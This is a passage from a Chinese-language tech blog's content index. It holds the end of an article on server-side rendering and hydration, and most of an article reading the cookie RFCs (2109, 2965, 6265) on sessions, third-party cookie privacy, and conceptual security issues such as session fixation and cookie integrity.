SSR」。 這篇對於 SSR 的定義為： Server-side rendering (SSR): rendering a client-side or universal app to HTML on the server. 所以像是第一種並沒有在 server 端去 render client-side app，應該也不會被算作 SSR。 Next.js第二份是 Next.js 官方的文件：https://nextjs.org/docs/pages/building-your-application/rendering 有提到的就是第三種叫做 SSR，第四種叫做 SSG。而這邊的定義其實又更不同了一點，它把「在 server 端產生 SPA 的 HTML」這件事情叫做 pre-render： By default, Next.js pre-renders every page. This means that Next.js generates HTML for each page in advance, instead of having it all done by client-side JavaScript. Pre-rendering can result in better performance and SEO. 而 SSR 專門指的是「每次 request 都產生 HTML」，藉此跟 SSG 做出區別。 Nuxt.js第三份來看 Nuxt.js：https://nuxt.com/docs/guide/concepts/rendering 文件裡面把第三種稱之為：「Universal Rendering」，其實我覺得取得還滿不錯的： To not lose the benefits of the client-side rendering method, such as dynamic interfaces and pages transitions, the Client (browser) loads the JavaScript code that runs on the Server in the background once the HTML document has been downloaded. The browser interprets it again (hence Universal rendering) and Vue.js takes control of the document and enables interactivity. 至於對 SSR 的定義，似乎沒有寫得太明確，不過從底下這句看起來： This step is similar to traditional server-side rendering performed by PHP or Ruby applications. 應該是「只要在 server render 畫面」都可以叫做 SSR。 Angular最後來看 Angular 的：https://angular.io/guide/ssr 它對 SSR 的定義為： Server-side rendering (SSR) is a process that involves rendering pages on the server, resulting in initial HTML content which contains initial page state. 這定義看起來應該跟剛那種差不多，只要是「rendering pages on the server」都可以稱之為 SSR。 SSR 的總結來講一下我寫到這邊以後，對於 SSR 的一些想法。 老實說我一開始好像有點把問題搞得太複雜了，SSR 就單純是指「在 server render 畫面」這件事情而已，所以確實只要符合這個前提就可以叫做 SSR。 其實這篇原本想寫的只有剛剛講的那幾種不同的 SSR 解決方案，但還沒寫之前就突然好奇起了 SSR 的定義，才有了開頭那些探索歷史的段落。 更重要的應該是對於 SSR 這個議題，是否能回答出要解決的問題是什麼，該怎麼解決，以及每種解法的優缺點等等，並不是每個網頁都需要 Next.js 才能做 SSR，要根據情境去選擇合適的技術。 接著，我們來談談現在進行式以及未來。 榨取更多的效能，打造更快的網頁原本我們提到的第三種解法看起來已經很完美了對吧？既可以在 server 端渲染畫面，解決 SEO 以及 first paint 的效能問題，又可以在 client 端做 hydration，讓後續操作都有 SPA 的體驗。 但其實還有能夠持續改善的地方。 前面有稍微提到 hydration 的一個小問題，那就是在 hydration 完成以前，雖然看到畫面了，但是這個網頁是沒辦法互動的。例如說你在 input 打字，可能不會有反應，因為那時候 event handler 還沒掛上去，或是 component 還沒 render 完。 那這該怎麼辦呢？有另外一個名詞出現了，叫做：Progressive Hydration，比起一次 hydration 整個頁面，不如一個一個區塊來做，還可以分優先順序，先把比較重要的區塊做完，使用者就可以馬上互動，再來做比較沒這麼重要的區塊。 除此之外，你會發現一個網頁的某幾個區塊，可能根本就不需要做 hydration，因為是不會變的，像是 footer 好了，根本沒有狀態，從頭到尾都長一樣。此時就可以運用另一種技巧叫做 Selective Hydration，提前 render 不需要 hydration 的區塊。 2019 年時，Etsy 的前端架構師 Katie Sylor-Miller 提出了 Islands Architecture，將一個網頁看作是由不同的小島組成： 上面這張圖就很能體現剛剛講的 selective hydration。當我們採用這樣的架構並且搭配 selective hydration 以及其他技巧之後，就能夠更快速地渲染，並且得到更好的效能。 例如說 Astro 就是使用了這樣的架構，整個頁面都是 static 的，只有需要互動的地方會獨立成為一個小島： &lt;MyReactComponent client:load /> React 目前也往這個方向在發展，server component 在這點上就滿類似的，藉由把頁面區分成 server 跟 client component，決定哪些需要狀態哪些不需要，不需要的就直接在 server render 完再送來 client，需要的就維持以前的作法。 這種方式確實會再讓網頁往上加速，但同時開發也變得越來越複雜，有更多東西需要考慮，debug 也更不方便了一些，一些心得跟細節我之後再寫篇文章分享吧。 總結我自己真正接觸各種前端工具的時間其實比較晚一點，撇除最開始寫 FrontPage 或是 Dreamweaver 那種不談，大概 2012 年左右開始寫 jQuery，接著就是觀望各種前端的發展但都沒有碰過，有曾經想學過 AngularJS（那時候真的很夯）還有 Ember.js，但就是懶。 是一直到 2015 年才開始在工作上接觸到 React，那時候是 React 剛在台灣要流行起來的時候。 所以早期 Backbone.js 那個年代的東西我沒有參與到，在寫這篇文章的時候找了不少資料，其實還滿有趣的，算是幫自己補足了沒有參與到的那一段歷史。 在查資料的時候，也發現 Yahoo! 真的是網頁前端的先行者，例如說 Atomic CSS 就是 Yahoo! 開始的，而這次也發現 2012 年時 Yahoo! 就已經在使用 Universal JavaScript 的網頁框架了。 如果你對 SSR 有不同的見解，或是覺得我對歷史發展脈絡的詮釋有點誤會，可以直接寫一篇新的文章與我交流，畢竟有些概念不是三言兩語可以講清楚的，寫篇文章比較完整；或是也可以透過留言討論。 參考資料 AJAX A Fond Farewell to YUI XMLHttpRequest Isomorphic The Future (and the Past) of the Web is Server Side Rendering Rendering on the Web: Performance Implications of Application Architecture (Google I&#x2F;O ’19)","link":"/2023/11/27/server-side-rendering-ssr-and-isomorphic/"},{"title":"淺談 Session 與 Cookie：一起來讀 RFC","text":"前言這是一系列共三篇的文章，我稱之為 Session 與 Cookie 三部曲。系列文的目標是想要由淺入深來談談這個經典議題，從理解概念一直到理解實作方式。這是系列文的第二篇，三篇的完整連結如下： 白話 Session 與 Cookie：從經營雜貨店開始 淺談 Session 與 Cookie：一起來讀 RFC 深入 Session 與 Cookie：Express、PHP 與 Rails 的實作 在上一篇裡面，我們提到了 Session 的意思： Session 是什麼？就是一種讓 Request 變成 stateful 的機制。以小明的例子來說，Session 就是一種讓客人之間能互相關聯起來的機制。在故事裡面我們用了紙條跟手機裡的資訊來比喻，有多種方式可以達成 Session。 其實在寫這系列的時候，「Session 最明確的定義是什麼」困擾了我一陣子，而且我到現在還不能完全肯定到底怎樣才是對的。在我心中有兩個解釋都滿合理的，第一個解釋就是上一篇跟大家講的，Session 是一種讓 Request 變成 stateful 的「機制」，而 Session 的第二種解釋（也是比較貼近英文原文的解釋），就是「具有狀態的一段期間」，或者是「上下文」，所以在 Session 裡面的東西可以放在一起看。 有一種說法認為 Session 的原意的確是第二種，但是在 Web 領域中 Session 轉變成了一種「機制」，所以兩個意思都通。但我自己其實是比較傾向第二種才是唯一正確的解釋方法，從頭到尾第二種都是對的，第一種則是誤解。 舉個例子來說，如果你有用過 Google Analytics，裡面有個名詞叫做「工作階段」，英文原名就叫做 Session，而 Google 對 Session 的解釋是這樣的： （來源：Analytics (分析) 定義網頁工作階段的方式） 它把 Session 定義為「指定期間內在網站上發生的多項使用者互動」，並且說可以把 Session 當作一個容器（Container）。雖然說 Google Analytics 的 Session 跟 Web 技術上所使用的 Session 本來就不同，但我認為多少可以互相參考。而這個 Session 的定義與我前面所說的「具有狀態的一段期間」或者是「上下文」其實是雷同的。 那為什麼儘管我比較偏向這個定義，卻在上一篇裡面隻字不提，還把 Session 定義成我眼中的「誤解」？ 第一個原因是搞不好兩種解釋都說得通，所以有可能兩個都是對的。第二個原因是我所認為的 Session 精確定義非常不好解釋，因為概念太抽象了。我認為若是提了這個解釋，只會把你對 Session 的理解越搞越亂，因此上一篇才沒有提到這個。第三個原因是我認為解釋成機制也可以，而且比較好理解，就算它真的是錯誤的，造成的影響也沒那麼大。 總之呢，我認為對完全沒有基礎的人來說，把 Session 理解成一種機制就可以了。但是對於像我這種想要追根究底的人來說，我想知道的是最正確的理解，而且必須是有憑有據的。 要怎樣才叫做有憑有據呢？去看當年談論 Cookie 與 Session 的 RFC 文件應該夠有憑有據了吧？RFC 文件可是要經歷過一系列討論與審核之後才能誕生，我想不到有哪邊的解釋能比 RFC 更具有說服力。 在這篇文章中我們會來稍微讀一下三份 RFC： RFC 2109 RFC 2965 RFC 6265 為什麼要讀三份呢？因為這三份都是跟 Cookie 相關的文件，2109 是最早的一份，後來出現一些問題所以被新的 2965 取代，過了十年後有了 6265，是目前最新的標準。 我認為讀東西從最早期的時候開始讀能夠事半功倍，因為東西應該會最少，理解上也比較容易，找資料也好找。例如說要讀 React 原始碼我會推薦從最早的 0.xx 版本開始讀，讀 ECMAScript 也可以從 ES3 開始，還可以順便知道演進的過程。 前情提要大概就到這邊了，本文的目標就是來讀 RFC，看看裡面是怎麼說 Cookie 與 Session 的。裡面我會對原文做一些翻譯，但畢竟翻譯是項專業，我翻的很差而且一定有錯誤，拜託大家還是要看原文，翻譯只能當作輔助。如果有哪邊錯的很離譜歡迎指出，我會十分感謝。 RFC 2109RFC 2109 發佈於 1997 年 2 月，那是個還沒有 Ajax 的年代，是個 Netscape 還稱霸瀏覽器市場的年代。 這份文件的標題叫做：「HTTP State Management Mechanism」，直翻就是 HTTP 狀態管理機制。 先來看摘要的部分： This document specifies a way to create a stateful session with HTTP requests and responses. It describes two new headers, Cookie and Set-Cookie, which carry state information between participating origin servers and user agents. The method described here differs from Netscape’s Cookie proposal, but it can interoperate with HTTP&#x2F;1.0 user agents that use Netscape’s method. (See the HISTORICAL section.) 這份文件規定了一種利用 HTTP request 與 response 建立有狀態的 session 的方法，並介紹了兩個新的 header：Cookie 跟 Set-Cookie，藉由這兩個 header 在 server 與 user agent（通常就是指瀏覽器）之間傳遞資訊。這邊所提到的方法與 Netscape 的 Cookie 提案不同，但可以互相兼容。 （每次翻譯翻一翻就會不想翻了…因為總覺得自己翻譯得不夠精確，翻譯真滴難） 摘要寫得很明確了，簡單來說就是引入 Cookie 與 Set-Cookie 兩個 Header 來建立 Session。會特別提到 Netscape 是因為 Cookie 這東西最早是 Netscape 自己實作的，只可惜我能找到的連結都死掉了，無緣看到 Netscape 的 Cookie 規範長什麼樣子。 再來第二個部分 TERMINOLOGY 就是規定一些專有名詞的用法，可以稍微掃過去就好，重點在第三個部分 STATE AND SESSIONS： This document describes a way to create stateful sessions with HTTP requests and responses. Currently, HTTP servers respond to each client request without relating that request to previous or subsequent requests; the technique allows clients and servers that wish to exchange state information to place HTTP requests and responses within a larger context, which we term a “session”. 這份文件規定了一種利用 HTTP request 與 response 建立有狀態的 session 的方法。目前 HTTP 伺服器獨立回應每一個 Request，不把它與其他 Request 關聯，而這個方法允許想要交換狀態資訊的 Server 與 Client 把 HTTP Request 與 Response 放在一個更大的 context 底下，我們稱之為一個 session。（這段我覺得超級難翻…而且一定翻得不好） This context might be used to create, for example, a “shopping cart”, in which user selections can be aggregated before purchase, or a magazine browsing system, in which a user’s previous reading affects which offerings are presented. 舉例來說，這個 context 可以用來建立購物車的功能，在購買前可以知道使用者選了哪些物品，或者是雜誌瀏覽系統，從以前讀過的東西推薦可能喜歡的內容。 這邊對於 Session 的定義就如同我前面所講的那樣，Session 是「具有狀態的一段期間」，或者是「上下文」，就是上面所提到的 context，在這個 context 裡面的 Request 與 Response 可以放在一起看，於是他們之間就有了狀態。 There are, of course, many different potential contexts and thus many different potential types of session. The designers’ paradigm for sessions created by the exchange of cookies has these key attributes: Each session has a beginning and an end. Each session is relatively short-lived. Either the user agent or the origin server may terminate a session. The session is implicit in the exchange of state information. 有很多種不同型態的 session，而藉由交換 cookie 所建立的 session 有幾個重點： 每個 session 都有開始與結束 每個 session 都是相對短暫的 瀏覽器或伺服器任何一方都可以終止這個 session Session 蘊含了交換狀態資訊的概念在裡面 這邊就是稍微介紹了一下 Session 的特性而已。若是我們把 Session 理解為是一種「機制」，那該如何解釋上面的段落？「每個 Session 機制都是相對短暫的」？，聽起來有點怪怪的，所以這也是為什麼我會說 Session 當作機制來解有一點奇怪。 接下來第四個章節很多部分都是在講那些 Header 的規格，這邊我們跳過不看，只節選幾個我認為比較重要的段落出來： 4.2.1 General The origin server initiates a session, if it so desires. (…) &gt;To initiate a session, the origin server returns an extra response header to the client, Set-Cookie. (The details follow later.) A user agent returns a Cookie request header (see below) to the origin server if it chooses to continue a session. 如果 Server 需要的話，它可以初始化一個 session，而初始化的方法是回傳一個 Set-Cookie 的 Header，若是瀏覽器決定繼續這個 session 的話，可以回傳 Cookie 這個 Header 簡單來說就是你把伺服器把狀態放在 Set-Cookie 這個 Header 裡面送去瀏覽器，而瀏覽器在之後的 Request 把 Cookie 帶上去，這樣子就成立一個 Session 了，因為後續的 Request 就有了狀態。 再來可以看一下第五個章節 EXAMPLES 的部分，我們來看其中一個例子，這邊的例子比較簡單，我就直接翻中文了，想看原文可以到這裡：5.1 Example 1。 第一步：瀏覽器 -&gt; 伺服器POST &#x2F;acme&#x2F;login HTTP&#x2F;1.1 [form data] 使用者透過表單登入。 第二步：伺服器 -&gt; 瀏覽器HTTP&#x2F;1.1 200 OK Set-Cookie: Customer&#x3D;&quot;WILE_E_COYOTE&quot;; Version&#x3D;&quot;1&quot;; Path&#x3D;&quot;&#x2F;acme&quot; 登入成功，伺服器發送 Set-Cookie Header 並設置資訊，儲存了使用者的身份。 第三步：瀏覽器 -&gt; 伺服器POST &#x2F;acme&#x2F;pickitem HTTP&#x2F;1.1 Cookie: $Version&#x3D;&quot;1&quot;; Customer&#x3D;&quot;WILE_E_COYOTE&quot;; $Path&#x3D;&quot;&#x2F;acme&quot; [form data] 使用者把某個物品加入購物車。 第四步：伺服器 -&gt; 瀏覽器HTTP&#x2F;1.1 200 OK Set-Cookie: Part_Number&#x3D;&quot;Rocket_Launcher_0001&quot;; Version&#x3D;&quot;1&quot;; Path&#x3D;&quot;&#x2F;acme&quot; 伺服器再設置一個 Cookie 來儲存剛剛加入購物車的東西。 第五步：瀏覽器 -&gt; 伺服器POST &#x2F;acme&#x2F;shipping HTTP&#x2F;1.1 Cookie: $Version&#x3D;&quot;1&quot;; Customer&#x3D;&quot;WILE_E_COYOTE&quot;; $Path&#x3D;&quot;&#x2F;acme&quot;; Part_Number&#x3D;&quot;Rocket_Launcher_0001&quot;; $Path&#x3D;&quot;&#x2F;acme&quot; [form data] 使用者利用表單選擇商品的運送方式。 第六步：伺服器 -&gt; 瀏覽器HTTP&#x2F;1.1 200 OK Set-Cookie: Shipping&#x3D;&quot;FedEx&quot;; Version&#x3D;&quot;1&quot;; Path&#x3D;&quot;&#x2F;acme&quot; 設置新的 Cookie 來儲存運送方式。 第七步：瀏覽器 -&gt; 伺服器POST &#x2F;acme&#x2F;process HTTP&#x2F;1.1 Cookie: $Version&#x3D;&quot;1&quot;; Customer&#x3D;&quot;WILE_E_COYOTE&quot;; $Path&#x3D;&quot;&#x2F;acme&quot;; Part_Number&#x3D;&quot;Rocket_Launcher_0001&quot;; $Path&#x3D;&quot;&#x2F;acme&quot; Shipping&#x3D;&quot;FedEx&quot;; $Path&#x3D;&quot;&#x2F;acme&quot; [form data] 使用者選擇結帳。 第八步：伺服器 -&gt; 瀏覽器HTTP&#x2F;1.1 200 OK 根據瀏覽器帶上來的 Cookie 得知用戶資料、購買品項以及運送方式，交易完成！ 上面這個範例大致說明了 Cookie 的運作方式，就是透過伺服器傳送 Set-Cookie 這個 header 來設置資訊，並且靠瀏覽器傳送 Cookie header 把之前儲存的資訊一併帶上來，這樣子就有了狀態，就開啟了一段 Session。 接著來看第六部分：IMPLEMENTATION CONSIDERATIONS，講到實作上的一些考量，這邊一樣截取片段： 6.1 Set-Cookie Content The session information can obviously be clear or encoded text that describes state. However, if it grows too large, it can become unwieldy. Therefore, an implementor might choose for the session information to be a key to a server-side resource. Of course, using a database creates some problems that this state management specification was meant to avoid, namely: keeping real state on the server side; how and when to garbage-collect the database entry, in case the user agent terminates the session by, for example, exiting. 存在 cookie 裡的 session 資訊可以是明文或是編碼過後的文字，但如果存的東西太多會變得太笨重。所以，你可以選擇只在 session 資訊裡放一個對應到伺服器資源的 key。但這種方式會造成一些這個狀態管理機制本來就想避免掉的一些問題，主要是： 把狀態放在 server 如何以及何時把沒有用的狀態資訊清掉 其實這種方式就是我們在上一篇所提到的兩個不同的方法：Cookie-based session 以及 SessionID，前者的缺點就是存太多東西會變得笨重，後者則是需要把狀態放在 Server。 兩種方式其實各有優劣，但比較常使用的還是 SessionID 那種方式，也就是原文提到的：「session information to be a key to a server-side resource」。 好，其他都是有關安全性或是跟隱私有關的部分，跟我們這篇要談的議題有點差異，因此我就不特別提了。 讓我們先來整理一下上面所看到的東西。 首先，Cookie 就是為了要建立 Session 而生的，因為在這之前要建立 Session 只能透過我上一篇提到的那些方式，例如說用網址列帶資訊，或者是在 form 裡面放一個 hidden 的欄位。為了簡化這些行為才有了 Cookie。 而實際方式就是 Server 回傳 Set-Cookie 的 header，User agent 把這些資訊儲存起來之後，在後續的 Request 都加上一個 Cookie header，這就是我們上一篇中所提到的「紙條」，每次都會帶著這個紙條，就讓 Request 之間有了狀態。 至於要在 Cookie 裡放什麼狀態都行，但如果放的東西太多可以考慮把這些狀態移到 Server 去，只在 Cookie 裡放一個可以對應的 ID。這就是我們之前所說的 Session ID 與 Session Data。 RFC 2965RFC 2965 誕生於 2000 年，不過它的內容跟 RFC 2109 其實相去不遠，大概有八成的內容都是一樣的。 為什麼呢？ 在 RFC 2109 出來之後不久他們發現了 IE3 與 Netscape Navigator3 對於這份「新的」Cookie 標準（舊的指的是 Netscape 原本自己的那套規範）實作不同，例如說以下這一段： Set-cookie: xx&#x3D;&quot;1&#x3D;2\\&amp;3-4&quot;; Comment&#x3D;&quot;blah&quot;; Version&#x3D;1; Max-Age&#x3D;15552000; Path&#x3D;&#x2F;; Expires&#x3D;Sun, 27 Apr 1997 01:16:23 GMT 在 IE 裡面會把 Cookie 設置成這樣：Cookie: Max-Age=15552000，在 Netscape Navigator 裡面則是我們預期的：Cookie: xx=&quot;1=2\\&amp;3-4&quot;.，同一段 Header 卻產生了不同的結果，於是他們就要想辦法來修正這個行為。 最後就有了 RFC 2965 的出現，解決方式是引入了兩個新的 Header：Cookie2 跟 Set-Cookie2，其餘部分都與 RFC 2109 差不多。 因此 2965 我們可以跳過不看，直接來看最新的 RFC 6265。 RFC 6265RFC 6265 是 2011 年出現的文件，跟上一份相隔 11 年。 而這份文件可以說是把 Cookie 規則再翻新了一遍，修改的幅度很大，在 Introduction 裡面就有說明了： Prior to this document, there were at least three descriptions of cookies: the so-called “Netscape cookie specification” [Netscape], RFC 2109 [RFC2109], and RFC 2965 [RFC2965]. However, none of these documents describe how the Cookie and Set-Cookie headers are actually used on the Internet (see [Kri2001] for historical context). 在這份文件之前，至少存在著三份不同的 Cookie 規格，第一個是 Netscape 的規格，再來是 RFC 2109 以及 2965。可是沒有一份文件真的在描述現今我們如何使用 Cookie 與 Set-Cookie。 有些我們現在在用的屬性，在 RFC 2965 都是不存在的，例如說 HttpOnly。這份規範把很多東西都定義的比較明確，有興趣的讀者可以自己去看。 接著我們來看一些有趣的地方好了，第一個是 3.1 Examples，裡面提到的範例直接使用了 SessionID： 3.1. Examples Using the Set-Cookie header, a server can send the user agent a short string in an HTTP response that the user agent will return in future HTTP requests that are within the scope of the cookie. For example, the server can send the user agent a “session identifier” named SID with the value 31d4d96e407aad42. The user agent then returns the session identifier in subsequent requests. 伺服器可以利用 Set-Cookie header 設置一個簡短的字串，而瀏覽器會在後續的 Request 把這個字串傳上來。舉例來說，伺服器可以傳送一個「session identifier」稱之為 SID，內容是 31d4d96e407aad42，而瀏覽器就會在之後的 Request 把這個 sessionID 傳上來。 底下還有提供更完整的範例，但有點長我就不翻了。其實我很推薦大家自己把這整份文件都看完，因為這整份文件定義的就是現在我們在使用的 Cookie 規格（基本上是啦，雖然還是有一點出入），你可以從規格裡面知道最正確的資訊。 例如說： 4.1.2.5. The Secure Attribute The Secure attribute limits the scope of the cookie to “secure” channels (where “secure” is defined by the user agent). When a cookie has the Secure attribute, the user agent will include the cookie in an HTTP request only if the request is transmitted over a secure channel (typically HTTP over Transport Layer Security (TLS)[RFC2818]). Secure 這個屬性限制了 Cookie 只能在「安全」的管道上傳輸（安全的定義由 user agent 自己定義）。當一個 Cookie 有了 Secure 這個屬性，只有當 Request 在安全的管道（通常指的是 TLS）中傳輸時才會把 cookie 放進 HTTP Request 裡面。 這邊我們就可以看到規格與實作的差異。規格只說了「什麼是安全由 user agent 自己定義」，而沒有強制規範說「一定要在 HTTPS 的時候才能傳輸」。所以一般我們所認知的「Secure 就是代表一定要 HTTPS 才會被傳送」其實指的是主流瀏覽器的實作，而不是 RFC 的規範。 所以如果想完整回答「設置 Secure 屬性代表什麼」這個問題，可以這樣回答： 代表這個 Cookie 只能透過 secure 的管道被傳輸，至於什麼是 secure，RFC 上寫說由瀏覽器自行定義。依據目前主流的實作，就是指只能透過 HTTPS 來傳送 再來我們來看跟我們切身相關的一個東西： 7.Privacy Considerations Cookies are often criticized for letting servers track users. For example, a number of “web analytics” companies use cookies to recognize when a user returns to a web site or visits another web site. Although cookies are not the only mechanism servers can use to track users across HTTP requests, cookies facilitate tracking because they are persistent across user agent sessions and can be shared between hosts. Cookie 因為可以被用來追蹤使用者而飽受批評。舉例來說，很多在做 web analytics 的公司用 cookie 來辨認用戶造訪了哪些網站。雖然 cookie 不是唯一能追蹤使用者的技術，但因為它可以在不同 host 被共享的特性，的確促進了這種追蹤的行為。 7.1. Third-Party Cookies Particularly worrisome are so-called “third-party” cookies. In rendering an HTML document, a user agent often requests resources from other servers (such as advertising networks). These third-party servers can use cookies to track the user even if the user never visits the server directly. For example, if a user visits a site that contains content from a third party and then later visits another site that contains content from the same third party, the third party can track the user between the two sites. 最令人擔心的就是第三方 cookie。在渲染 HTML 頁面時，瀏覽器常會發送一些 Request 去其他的 Server（例如說廣告商的伺服器），所以儘管這些使用者從來沒有直接造訪這些網站，這些網站可以利用 Cookie 來追蹤使用者。舉例來說，使用者造訪了有跟某廣告商合作的 A 網站，然後又去了跟同個廣告商有合作的 B 網站，廣告商就可以在這兩個網站之間追蹤使用者。 Some user agents restrict how third-party cookies behave. For example, some of these user agents refuse to send the Cookie header in third-party requests. Others refuse to process the Set-Cookie header in responses to third-party requests. User agents vary widely in their third-party cookie policies. This document grants user agents wide latitude to experiment with third-party cookie policies that balance the privacy and compatibility needs of their users. However, this document does not endorse any particular third-party cookie policy. 有些瀏覽器會限制第三方 Cookie。舉例來說，有些不發送 Cookie header 給第三方，有些則是不處理第三方的 Set-Cookie header。每一個瀏覽器對於第三方 cookie 的處理方式都不太一樣，而這份文件給了瀏覽器很大的空間去實驗什麼是對使用者最好的策略，試圖在隱私與兼容性之間取得一個平衡。然而，這份文件不會認可任何一個特定的第三方 cookie 處理方式。 Third-party cookie blocking policies are often ineffective at achieving their privacy goals if servers attempt to work around their restrictions to track users. In particular, two collaborating servers can often track users without using cookies at all by injecting identifying information into dynamic URLs. 如果 Server 用一些 workaround 追蹤使用者的話，阻擋第三方 cookie 的策略其實不是那麼有用。例如說他們可以把資訊附加在 URL 上面來追蹤用戶，而不透過 Cookie。 其實當初在 RFC 2109 就有談論過第三方 cookie 的議題，只是那時候叫做 Unverifiable Transactions，看到的時候我有嚇了一跳，在 1997 年剛有 cookie 的時候就已經提到了第三方 cookie 的問題。 畢竟這個問題感覺在近期才比較被廣泛討論，而且在近幾年 Safari 跟 Firefox 才預設阻擋第三方 cookie。甚至連 Facebook 之後的解法 dynamic URLs 都早已出現在 RFC 6265 上面（我超討厭那串 fbcid…）。 最後我們來看一些跟安全性相關的東西，都在 8.Security Considerations 裡面： 8.4. Session Identifiers Instead of storing session information directly in a cookie (where it might be exposed to or replayed by an attacker), servers commonly store a nonce (or “session identifier”) in a cookie. When the server receives an HTTP request with a nonce, the server can look up state information associated with the cookie using the nonce as a key. 比起把 session 資訊直接存在 cookie 裡面，server 通常只在 cookie 裡面存一個 sessionID，當 server 收到這個 sessionID 的時候就能夠找到相對應的資料。 Using session identifier cookies limits the damage an attacker can cause if the attacker learns the contents of a cookie because the nonce is useful only for interacting with the server (unlike non- nonce cookie content, which might itself be sensitive). Furthermore, using a single nonce prevents an attacker from “splicing” together cookie content from two interactions with the server, which could cause the server to behave unexpectedly. 跟直接把敏感資訊存在 cookie 比起來，只存 sessionID 能夠侷限攻擊者所能造成的傷害，因為就算攻擊者知道裡面存了 sessionID 也沒什麼用。（splicing 那段看得不是很懂） Using session identifiers is not without risk. For example, the server SHOULD take care to avoid “session fixation” vulnerabilities. A session fixation attack proceeds in three steps. First, the attacker transplants a session identifier from his or her user agent to the victim’s user agent. Second, the victim uses that session identifier to interact with the server, possibly imbuing the session identifier with the user’s credentials or confidential information. Third, the attacker uses the session identifier to interact with server directly, possibly obtaining the user’s authority or confidential information. 使用 sessionID 也不是完全沒有風險。舉例來說，server 應該要避免 session fixation 這種攻擊方法。這種攻擊方法有三個步驟，第一個步驟是先產生一個 sessionID，並且把這 ID 傳給受害者；第二步是受害者用這個 sessionID 來登入；在受害者登入以後，攻擊者就能夠使用同樣的 sessionID 取得受害者的資料。 原文對固定 Session（Session fixation）的說明沒有很清楚，有興趣的朋友可以參考 HTTP Session 攻擊與防護，這篇講得比較清楚一點。 簡單來說就是讓受害者用你指定的 sessionID 登入，所以在 Server 端這個 sessionID 就會跟受害者的帳號綁在一起。接著你再用同樣的 sessionID，就可以用受害者的身份登入並且使用網站。 接著我們再來看另外一個安全性問題： 8.6. Weak Integrity Cookies do not provide integrity guarantees for sibling domains (and their subdomains). For example, consider foo.example.com and bar.example.com. The foo.example.com server can set a cookie with a Domain attribute of “example.com” (possibly overwriting an existing “example.com” cookie set by bar.example.com), and the user agent will include that cookie in HTTP requests to bar.example.com. In the worst case, bar.example.com will be unable to distinguish this cookie from a cookie it set itself. The foo.example.com server might be able to leverage this ability to mount an attack against bar.example.com. Cookies 對 subdomain 並不具有完整性。舉例來說，foo.example.com 可以對 example.com 設置 cookie，而這個有可能把 bar.example.com 對 example.com 設置的 cookie 給蓋掉。最糟的情況下，當 bar.example.com 收到這個 cookie 時，區分不出是自己設置的還是別人設置的。foo.example.com 就可以利用這個特性來攻擊 bar.example.com。 An active network attacker can also inject cookies into the Cookie header sent to https://example.com/ by impersonating a response from http://example.com/ and injecting a Set-Cookie header. The HTTPS server at example.com will be unable to distinguish these cookies from cookies that it set itself in an HTTPS response. An active network attacker might be able to leverage this ability to mount an attack against example.com even if example.com uses HTTPS exclusively. 攻擊還可以利用 http://example.com/ 來把 https://example.com/（前者是 http，後者 https）的 cookie 蓋掉，server 就無法分辨這個 cookie 是 http 還是 https 設置的。攻擊者一樣可以利用這個特性來進行攻擊。 上面這一段在 4.1.2.5 The Secure Attribute 其實也有提到： Although seemingly useful for protecting cookies from active network attackers, the Secure attribute protects only the cookie’s confidentiality. An active network attacker can overwrite Secure cookies from an insecure channel, disrupting their integrity 大意就是說 Secure 屬性沒辦法保障 cookie 的完整性。攻擊者可以從 HTTP 覆蓋掉 HTTPS 的 cookie。 看到這邊的時候我心頭一驚，這個不就是在講我之前寫過的：我遇過的最難的 Cookie 問題嗎？現在我也終於知道為什麼 Safari 跟 Firefox 都沒有擋這種行為，因為在規格裡面並沒有要求你一定要擋。 至於 Chrome 的話，它的實作參考了幾個不同的 RFC，在負責管理 Cookie 的 CookieMonster 裡面有寫到： CookieMonster requirements are, in theory, specified by various RFCs. RFC 6265 is currently controlling, and supersedes RFC 2965. However, most browsers do not actually follow those RFCs, and Chromium has compatibility with existing browsers as a higher priority than RFC compliance. An RFC that more closely describes how browsers normally handles cookies is being considered by the RFC; it is available at http://tools.ietf.org/html/draft-ietf-httpstate-cookie. The various RFCs should be examined to understand basic cookie behavior; this document will only describe variations from the RFCs. 在 CookieMonster.cc 裡面也有寫到： If the cookie is being set from an insecure scheme, then if a cookie already exists with the same name and it is Secure, then the cookie should not be updated if they domain-match and ignoring the path attribute. See: https://tools.ietf.org/html/draft-ietf-httpbis-cookie-alone 文中所提到的文件還在草稿階段，標題是：「Deprecate modification of ‘secure’ cookies from non-secure origins」，是由 Google 的員工所發起的草稿。在 Introduction 的地方寫的很明確了： Section 8.5 and Section 8.6 of [RFC6265] spell out some of the drawbacks of cookies’ implementation: due to historical accident, non-secure origins can set cookies which will be delivered to secure origins in a manner indistinguishable from cookies set by that origin itself. This enables a number of attacks, which have been recently spelled out in some detail in [COOKIE-INTEGRITY]. We can mitigate the risk of these attacks by making it more difficult for non-secure origins to influence the state of secure origins. Accordingly, this document recommends the deprecation and removal of non-secure origins’ ability to write cookies with a ‘secure’ flag, and their ability to overwrite cookies whose ‘secure’ flag is set. 大意就是說跟我們剛剛在 RFC 6265 的 Section 8.5 與 8.6 看到的一樣，由於一些歷史因素，secure 的 cookie 可以被 non-secure 的來源蓋掉。而這份文件就是要試著阻止這種行為。 看到這邊，與 Session 跟 Cookie 相關的文件差不多都讀完了，讓我們做個簡單的總結。 總結回到最開始的問題：到底 Session 是什麼？ 從 RFC 裡面提到的各種 Session 相關的字眼，我會認為 Session 就是它英文的原意之一，代表著：「具有狀態的一段期間」或者是「上下文」，所以你想要開啟或是建立一個 Session，必要條件就是先有一個機制來建立及保留狀態。 這也是為什麼 Cookie 的 RFC 標題為：HTTP State Management Mechanism，狀態管理機制。在 Cookie 還沒出現以前，一樣可以建立 Session，可以把狀態資訊放在網址列上面或是藏在 form 表單中。但 Cookie 出現以後建立 Session 變成一件更容易的事，只要使用 Set-Cookie 與 Cookie 這兩個 header 就好了。 建立 Session 之後，所儲存的狀態就叫做 Session information，可以翻作 Session 資訊。若是選擇把這些資訊存在 Cookie 裡面，就叫做 Cookie-based session；還有另一種方法則是在 Cookie 裡面只存一個 SessionID，其他的 Session 資訊都存在 Server 端，靠著這個 ID 把兩者關聯起來。 除了 Session 以外，我們也在 RFC 裡面看見一些有趣的東西，例如說第三方 Cookie 的隱私疑慮以及與 Cookie 相關的安全性問題。這些也能加深你對於 Cookie 的理解。 在結束以前，我誠心推薦一篇文章：HTTP Cookies: Standards, Privacy, and Politics，網頁右邊可以下載 PDF 來看。這篇文章的作者就是 RFC 2109 與 2965 的作者。文章裡面把 Cookie 出現的歷史以及當初發生的事講的一清二楚，強烈建議大家都可以花點時間來看這篇文章，可以深入地理解 